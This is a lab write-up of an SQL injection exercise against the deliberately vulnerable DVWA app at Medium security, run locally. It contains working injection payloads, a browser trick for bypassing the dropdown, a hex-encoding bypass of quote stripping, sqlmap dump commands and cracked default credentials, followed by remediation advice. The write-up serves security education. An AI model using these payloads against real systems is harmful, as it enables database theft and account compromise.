# Task 9: Advanced SQL Injection on DVWA (Medium Security)

## Executive Summary

This report documents an advanced SQL injection assessment conducted against DVWA running at Medium security level. The assessment demonstrated that security filters designed to prevent SQL injection can be bypassed using alternative techniques, and that a determined attacker can extract complete database credentials even from a system with basic input filtering in place.

During this assessment, four manual payloads were successfully executed against the target application, resulting in the complete enumeration of the database schema and extraction of all user credentials including password hashes. Additionally, sqlmap was used to automate the same discovery process, successfully cracking the extracted password hashes automatically. The overall risk level of this vulnerability is rated Critical.

**Business Impact:** A SQL injection vulnerability of this severity in a production application would allow an attacker to extract every record from the database, including customer personal data, financial records, and user credentials. Depending on database configuration, it may also allow an attacker to read system files or execute operating system commands. The reputational, financial, and regulatory consequences of such a breach would be severe, including potential GDPR violations, customer notification obligations, and significant remediation costs.

---

## Background & Ethical Use

**Ethical Use Notice:** All techniques demonstrated in this report were performed exclusively against DVWA running locally on the assessor's own machine. DVWA is a deliberately vulnerable application designed for security education. Never attempt SQL injection against any real website, application, or service without explicit written authorization. Unauthorized SQL injection constitutes a criminal offense under computer misuse laws in most jurisdictions.

---

## Environment

| Component | Detail |
|-----------|--------|
| Operating System | Kali Linux (VMware Fusion on macOS) |
| Web Server | Apache 2.4.63 |
| Database | MariaDB 11.4.5 |
| PHP Version | 8.4.4 |
| DVWA Security Level | Medium |
| Target URL | http://127.0.0.1/DVWA/vulnerabilities/sqli/ |

---

## Key Difference from Task 3 (Low Security)

At Low security, DVWA accepts free text input directly. At Medium security, DVWA implements two defenses:

1. The input field is replaced with a dropdown menu, preventing direct text input
2. Single quotes are stripped from any submitted values

**How we bypassed both defenses:**

The dropdown was bypassed by modifying the HTML form directly using browser developer tools, replacing the select element with a text input field using:

```javascript
document.querySelector('select[name="id"]').outerHTML = '<input type="text" name="id">'
```

The quote stripping was bypassed using two techniques:
- **Numeric injection:** Payloads that do not require quotes (e.g., `1 OR 1=1` instead of `1' OR '1'='1`)
- **Hex encoding:** String values encoded in hexadecimal (e.g., `0x64767761` instead of `'dvwa'`) which the database interprets correctly without needing quote characters

---

## Manual Attack Methodology

### Payload 1: Numeric OR Injection

**Payload:** `1 OR 1=1`

**Technique:** Numeric injection bypassing quote filter

**Result:** All 5 user records returned from the database

**Significance:** Demonstrates that stripping single quotes does not prevent SQL injection. Numeric conditions require no quote characters.

See screenshot: `sqli9_1_or_injection.png`

### Payload 2: Full Database Table Enumeration

**Payload:** `1 UNION SELECT table_name, table_schema FROM information_schema.tables#`

**Technique:** UNION-based information schema query

**Result:** Complete list of all tables across all databases on the server including information_schema, sys, performance_schema, and dvwa databases.

**Significance:** Gives the attacker a complete map of the database server before targeting specific tables.

See screenshot: `sqli9_2_table_enumeration.png`

### Payload 3: Column Enumeration with Hex Encoding

**Payload:** `1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=0x64767761#`

**Technique:** Hex-encoded string bypass of quote filter

**Result:** Complete column structure of the dvwa database revealed:

| Table | Columns |
|-------|---------|
| users | user_id, first_name, last_name, user, password, avatar, last_login, failed_login, role, account_enabled |
| security_log | id, user_id, target_id, action, timestamp, ip_address |
| access_log | id, user_id, target_id, action, timestamp |
| guestbook | comment_id, comment, name |

**Significance:** `0x64767761` is the hexadecimal encoding of the string `dvwa`. The database interprets hex values as strings without requiring quote characters, bypassing the Medium security filter entirely.

See screenshot: `sqli9_3_column_enumeration.png`

### Payload 4: Credential Extraction

**Payload:** `1 UNION SELECT user, password FROM users#`

**Result:** All usernames and MD5 password hashes extracted:

| Username | MD5 Hash |
|----------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |

**Significance:** MD5 is a cryptographically broken hashing algorithm. The hash `5f4dcc3b5aa765d61d8327deb882cf99` is the MD5 hash of the word "password" and can be reversed instantly using publicly available rainbow tables.

See screenshot: `sqli9_4_credential_extraction.png`

---

## sqlmap Automated Discovery (Bonus)

sqlmap was used to automate the SQL injection discovery and exploitation process for comparison against manual findings.

### Database Enumeration

```bash
sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=medium" --dbs --batch
```

Result: Three databases identified: dvwa, information_schema, sys — matching manual findings exactly.

See screenshot: `sqli9_5_sqlmap_dbs.png`

### Credential Extraction and Password Cracking

```bash
sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=your_session_id; security=medium" -D dvwa -T users --dump --batch
```

Result: sqlmap extracted all usernames and MD5 hashes, then automatically cracked the passwords using its built-in dictionary:

| Username | Cracked Password |
|----------|-----------------|
| admin | password |
| gordonb | abc123 |
| 1337 | charley |
| pablo | letmein |
| smithy | password |

See screenshot: `sqli9_6_sqlmap_dump.png`

### Manual vs sqlmap Comparison

| Task | Manual | sqlmap |
|------|--------|--------|
| Finding vulnerability | Tested payloads manually | Automatically detected in seconds |
| Database enumeration | Required crafting UNION queries | Single flag --dbs |
| Column enumeration | Required hex encoding bypass | Automatic |
| Credential extraction | Got hashes only | Got hashes AND cracked passwords |
| Time required | Several minutes | Under 30 seconds |

sqlmap demonstrates that automated tools dramatically accelerate SQL injection exploitation. However, understanding manual techniques is essential for situations where automated tools are blocked by WAFs or rate limiting, and for understanding why the vulnerability exists at a fundamental level.

---

## Remediation

### Why This Vulnerability Exists

The vulnerability exists because user input is directly concatenated into the SQL query string. The Medium security filter attempts to sanitize input by removing single quotes, but this approach is fundamentally flawed because SQL injection can be achieved through many techniques that do not require quote characters. Blacklist-based input filtering is not a reliable defense against SQL injection.

The vulnerable code pattern:

```php
$id = $_POST['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
```

Even with quote stripping applied, inserting the variable directly into the query without parameterization leaves the application vulnerable to numeric injection.

### Fix 1: Parameterized Queries in PHP

```php
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

With parameterized queries, user input is always treated as a data value, never as SQL code. The database driver handles all escaping internally, making injection impossible regardless of what the user inputs.

### Fix 2: Parameterized Queries in Python

```python
import mysql.connector

conn = mysql.connector.connect(
    host="localhost",
    user="dbuser",
    password="dbpassword",
    database="dvwa"
)

cursor = conn.cursor()
query = "SELECT first_name, last_name FROM users WHERE user_id = %s"
cursor.execute(query, (user_id,))
results = cursor.fetchall()
```

The `%s` placeholder is filled by the database driver with the sanitized value of `user_id`. The input is never interpreted as SQL syntax.

### Additional Defenses

- **Input validation:** Validate that the user_id field contains only numeric digits before passing it to the database
- **Least privilege:** The database account used by the application should only have SELECT permission on required tables
- **Web Application Firewall:** Deploy a WAF to detect and block common injection patterns at the network perimeter
- **Error handling:** Never display raw database error messages to users as they reveal schema information useful for injection attacks

---

## Key Learnings

- Input filtering using blacklists is not a reliable defense against SQL injection. Attackers can bypass quote stripping using numeric injection and hex encoding.
- A determined attacker who can enumerate the database schema can extract any data the database user has access to, regardless of how complex the table structure is.
- Automated tools like sqlmap can discover, exploit, and crack credentials from a vulnerable application in under 30 seconds, demonstrating the urgency of fixing SQL injection vulnerabilities immediately.
- The progression from Low to Medium security in DVWA illustrates why defense-in-depth matters. Each additional filter adds friction but does not prevent exploitation by someone who understands the underlying vulnerability.
- Parameterized queries are the only reliable fix for SQL injection. All other controls should be treated as supplementary layers, not primary defenses.

---

## References

- PortSwigger Web Security Academy — SQL Injection: https://portswigger.net/web-security/sql-injection
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Testing Guide — SQL Injection: https://owasp.org/www-project-web-security-testing-guide/
- sqlmap Official Documentation: https://sqlmap.org/
- MITRE ATT&CK — Exploit Public Facing Application: https://attack.mitre.org/techniques/T1190/
- PHP PDO Prepared Statements: https://www.php.net/manual/en/pdo.prepared-statements.php
- Python MySQL Connector: https://dev.mysql.com/doc/connector-python/en/
